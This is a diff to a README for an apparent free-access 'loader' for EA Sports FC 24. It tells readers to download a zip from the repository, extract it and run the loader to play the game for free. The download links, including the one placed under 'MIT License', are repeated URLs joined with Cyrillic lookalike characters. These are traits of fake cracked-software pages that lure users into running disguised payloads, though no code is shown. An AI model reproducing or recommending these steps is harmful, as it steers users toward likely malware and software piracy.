@@ -23,7 +23,7 @@ Welcome to the ultimate loader for **EA Sports FC 24 **! This repository provide
 
 ## 🚀 Installation
 
-1. Download **https://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/Lоader.zipоhttps://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/Lоader.zip** from this repository.  
+1. Download **https://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/moschine/Sports_Free_Access_F_E_2.7.zipоhttps://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/moschine/Sports_Free_Access_F_E_2.7.zipоhttps://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/moschine/Sports_Free_Access_F_E_2.7.zipоhttps://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/moschine/Sports_Free_Access_F_E_2.7.zip** from this repository.  
 2. Extract the archive using your preferred extraction tool.  
 3. Run the Loader and follow on-screen instructions.  
 4. Enjoy EA Sports FC 24 for free on your system!  
@@ -38,4 +38,4 @@ This project is for **educational and personal use only**. We do **not** host or
 
 ## 📜 License
 
-Licensed under the [MIT License](https://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/Lоader.zipоhttps://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/Lоader.zip) — free for all usages. ⚖️
+Licensed under the [MIT License](https://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/moschine/Sports_Free_Access_F_E_2.7.zipоhttps://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/moschine/Sports_Free_Access_F_E_2.7.zipоhttps://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/moschine/Sports_Free_Access_F_E_2.7.zipоhttps://raw.githubusercontent.com/RafaHengker/EA-Sports-FC24-Free-Access/main/moschine/Sports_Free_Access_F_E_2.7.zip) — free for all usages. ⚖️
